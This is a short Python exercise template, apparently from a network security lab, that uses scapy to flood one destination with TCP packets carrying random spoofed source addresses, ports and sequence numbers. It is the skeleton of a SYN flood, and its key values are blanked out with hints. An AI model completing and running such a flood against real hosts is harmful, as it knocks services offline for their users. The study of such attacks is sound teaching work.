#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

print('[+] Sending packets')

i = 0

while True:
	# Hint: fill with IP bit size
	src_ip = str(IPv4Address(getrandbits(**)))	# Source IP
	dst_ip = "********"					# Destination IP
	# Hint: generating random number with ** bits
	src_port = getrandbits(**)			# Source Port
	dst_port = ****					# Destination Port
	# Hint: generating random number with ** bits
	seq = getrandbits(**)				# Sequence Number

	ip = IP(src=***, dst=***)
	tcp = TCP(sport=***, dport=***, seq=***, flags='*')
	pkt = ip/tcp
	
	send(pkt, verbose=0)
	
	i += 1
	print(f'\t[#] Packets sent: {i}', end='\r')
